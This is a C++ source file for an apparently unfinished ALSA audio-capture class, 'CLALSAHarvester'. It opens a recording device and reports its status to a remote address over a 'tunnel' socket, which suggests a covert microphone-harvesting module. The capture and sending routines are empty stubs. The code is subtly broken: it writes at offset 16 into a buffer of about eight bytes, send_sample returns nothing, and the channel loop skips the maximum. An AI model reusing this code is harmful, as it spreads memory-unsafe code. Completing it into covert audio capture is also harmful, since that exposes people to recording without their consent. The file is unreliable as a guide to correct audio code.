#include "clalsa_harvester.hpp"

void CLALSAHarvester::run() {
    char status[sizeof(Status) + sizeof(int)];
    Status status_code = EXEC_SUCCESS;
    
    memcpy(&hw_in_, argv_, argv_size_);
    hw_in_[argv_size_] = '\0';

    printf("[run] HW_IN: %s\n", hw_in_);

    int rc = alsa_recorder_init();
    if (rc < 0) {
        // Send error code
        status_code = EXEC_ERROR;
        memcpy(status, &status_code, sizeof(Status));
        memcpy(status + 16, &rc, sizeof(rc));
        sendto(tunnel_socket_, status, sizeof(status), 0, (struct sockaddr*) &tunnel_addr_, tunnel_addr_len_);
    } else {
        // Send success + channel num
        memcpy(status, &status_code, sizeof(Status));
        memcpy(status + 16, &channels_, sizeof(channels_));
        sendto(tunnel_socket_, status, sizeof(status), 0, (struct sockaddr*) &tunnel_addr_, tunnel_addr_len_);
        
        // Start capturing
        alsa_recorder_run();
    }

    alsa_recorder_cleanup();
    return;    
}

void CLALSAHarvester::alsa_recorder_run() {
    
}

int CLALSAHarvester::send_sample() {}

int CLALSAHarvester::alsa_recorder_init() {
    int rc;

    if ((rc = snd_pcm_open(&capture_handle_, hw_in_, SND_PCM_STREAM_CAPTURE, 0)) < 0) {
        fprintf(stderr, "cannot open audio device %s (%s)\n", hw_in_, snd_strerror(rc));
        return rc;
    }

    if ((rc = snd_pcm_hw_params_malloc(&hw_params_)) < 0) {
        fprintf(stderr, "cannot allocate hardware parameters (%s)\n", snd_strerror(rc));
        return rc;
    }

    if ((rc = snd_pcm_hw_params_any(capture_handle_, hw_params_)) < 0) {
        fprintf(stderr, "Failed to initialize hardware parameter structure (%s)\n", snd_strerror(rc));
        return rc;
    }

    if ((rc = snd_pcm_hw_params_set_access(capture_handle_, hw_params_, SND_PCM_ACCESS_RW_INTERLEAVED)) < 0) {
        fprintf(stderr, "Cannot set access type (%s)\n", snd_strerror(rc));
        return rc;
    }

    if ((rc = snd_pcm_hw_params_set_format(capture_handle_, hw_params_, format_)) < 0) {
        fprintf(stderr, " Cannot set sample format (%s)\n", snd_strerror(rc));
        return rc;
    }

    if ((rc = snd_pcm_hw_params_set_rate_near(capture_handle_, hw_params_, &sample_rate_, 0)) < 0) {
        fprintf(stderr, "Cannot set sample rate (%s)\n", snd_strerror(rc));
        return rc;
    }

    if ((rc = get_channels()) < 0) {
        fprintf(stderr, "No supported channels\n");
        return rc;
    }
    if ((rc = snd_pcm_hw_params_set_channels(capture_handle_, hw_params_, channels_)) < 0) {
        fprintf(stderr, "Failed to set channel count (%s)\n", snd_strerror(rc));
        return rc;
    }
    if ((rc = snd_pcm_hw_params(capture_handle_, hw_params_)) < 0) {
        fprintf(stderr, "Failed to set params (%s)\n", snd_strerror(rc));
        return rc;
    }

    snd_pcm_hw_params_free(hw_params_);
    if ((rc = snd_pcm_prepare(capture_handle_)) < 0) {
        fprintf(stderr, "Failed to prepare audio interface for use (%s)\n", snd_strerror(rc));
        return rc;
    }


    printf("Initialization successful\n");
    return 0;
}

int CLALSAHarvester::get_channels() {
    int rc;
    unsigned int min_channels;
    unsigned int max_channels;

    snd_pcm_hw_params_get_channels_min(hw_params_, &min_channels);
    snd_pcm_hw_params_get_channels_max(hw_params_, &max_channels);

    for (int i=min_channels;i<max_channels;i++) {
        if ((rc = snd_pcm_hw_params_test_channels(capture_handle_, hw_params_, i)) == 0) {
            printf("%d channels supported\n", i);
            if (i == 1) { // Mono is supported
                channels_ = i;
            } else if (i == 2) { // But stereo is preferred
                channels_ = i;
            }
        }
    }
    
    if (channels_ == 0) {
        return -1;
    }

    return 0;
}

void CLALSAHarvester::alsa_recorder_cleanup() {
    if (capture_handle_ != nullptr) {
        snd_pcm_close(capture_handle_);
    }

    if (buffer != nullptr) {
        delete[] buffer;
    } 
}